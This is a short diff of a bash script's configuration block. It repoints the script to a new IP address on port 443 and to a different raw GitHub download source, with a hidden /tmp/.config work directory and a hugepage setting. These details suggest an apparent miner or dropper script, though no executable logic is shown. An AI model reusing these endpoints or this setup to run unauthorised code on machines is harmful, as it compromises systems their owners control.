@@ -1,10 +1,10 @@
 #!/bin/bash
 
 mode="${1:-0}"
-port="1130"
-host="dyn.dream.avspic.com"
+port="443"
+host="167.99.139.112"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/vjbahkds/ascbhbv/main"
+src="https://raw.githubusercontent.com/superade99/entahlah/main"
 hugepage="128"
 
 portAdd="$((RANDOM % 10))"
